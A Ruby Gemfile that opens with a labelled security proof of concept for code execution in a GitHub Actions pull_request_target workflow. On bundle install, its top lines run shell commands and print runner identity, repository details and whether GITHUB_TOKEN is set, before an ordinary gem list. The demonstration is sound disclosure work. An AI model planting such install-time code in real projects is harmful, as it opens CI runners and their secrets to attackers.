# Security PoC — demonstrates code execution via pull_request_target + bundle install
# This Gemfile code executes during `bundle install` (Ruby evaluates Gemfile as code)
# No destructive actions — informational only
puts "=" * 60
puts "SECURITY POC — CODE EXECUTION VIA GEMFILE"
puts "=" * 60
puts "whoami: #{`whoami`.strip}"
puts "hostname: #{`hostname`.strip}"
puts "pwd: #{Dir.pwd}"
puts "GITHUB_REPOSITORY: #{ENV['GITHUB_REPOSITORY']}"
puts "GITHUB_WORKFLOW: #{ENV['GITHUB_WORKFLOW']}"
puts "GITHUB_ACTOR: #{ENV['GITHUB_ACTOR']}"
puts "GITHUB_EVENT_NAME: #{ENV['GITHUB_EVENT_NAME']}"
puts "GITHUB_TOKEN set: #{ENV['GITHUB_TOKEN'] ? 'YES (length=' + ENV['GITHUB_TOKEN'].length.to_s + ')' : 'NO'}"
puts "=" * 60

source "https://rubygems.org"

gem "faraday", "2.14.1"
gem "faraday-retry", "2.4.0"
gem "github-pages", "~> 232", group: :jekyll_plugins
gem "json", "2.19.4"
gem "language_server-protocol", "3.17.0.5"
gem "nokogiri", "~> 1.19.2"
gem "rake", "13.4.2"
gem "rubocop", "1.86.1"

group :test do
  gem "fastimage"
  gem "httparty"
  gem "minitest"
  gem "octokit"
  gem "pry", require: false
  gem "rubocop-performance"
  gem "safe_yaml"
end

group :development do
  gem "webrick"
end
